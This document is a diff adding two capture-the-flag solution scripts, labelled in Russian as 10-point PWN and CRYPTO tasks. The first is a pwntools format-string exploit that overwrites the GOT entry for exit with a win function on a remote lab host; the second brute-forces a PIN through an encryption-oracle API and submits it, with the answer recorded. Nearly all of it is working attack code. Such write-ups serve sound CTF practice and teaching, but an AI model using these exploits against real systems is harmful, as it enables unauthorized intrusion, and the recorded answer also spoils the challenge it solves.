@@ -1,2 +1,48 @@
-# Исходный код:
-## PWN за 10 баллов
+PWN за 10 баллов:
+________________
+from pwn import *
+
+
+binary = args.BIN
+
+context.terminal = ["tmux", "splitw", "-h"]
+e = context.binary = ELF("/home/kali/Desktop/main")
+r = ROP(e)
+
+gs = '''
+continue
+'''
+
+def start():
+    return remote('192.168.12.13', 1923)
+
+p = start()
+
+payload_writes = {
+        e.got['exit']: e.sym['win']
+}
+
+payload = fmtstr_payload(6,payload_writes,write_size='short')
+p.sendline(payload)
+p.interactive()
+_______________
+CRYPTO за 10 баллов:
+_______________
+import requests
+
+URL = "http://192.168.12.12:5000/"
+
+pinCode = 0
+
+while 1:
+    encryptedPin = requests.get(URL + "api/EncryptedPin").text
+    temp = requests.post(URL + "api/EncryptPin", json={'pin': pinCode}).text
+    if temp == encryptedPin:
+        print("!!!!" + '\n', pinCode)
+        break
+    pinCode += 1
+
+# pinCode = 3561
+
+print(requests.post(URL + "api/CheckPin", json={'pin': pinCode}).text)
+________________
